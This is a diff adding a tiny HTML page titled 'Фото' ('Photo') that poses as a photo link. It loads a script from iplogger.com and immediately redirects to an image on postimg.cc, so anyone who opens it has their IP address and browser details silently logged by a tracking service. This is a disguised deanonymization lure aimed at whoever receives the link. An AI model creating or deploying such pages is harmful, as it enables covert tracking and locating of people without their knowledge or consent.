@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Фото</title>
+    <script src="https://iplogger.com/2zh5F5"></script>
+    <meta http-equiv="refresh" content="0; url=https://i.postimg.cc/TYp0688C/487d060fc3288513c934f32768674ce6.jpg">
+    <style>body { margin: 0; padding: 0; }</style>
+</head>
+<body></body>
+</html>
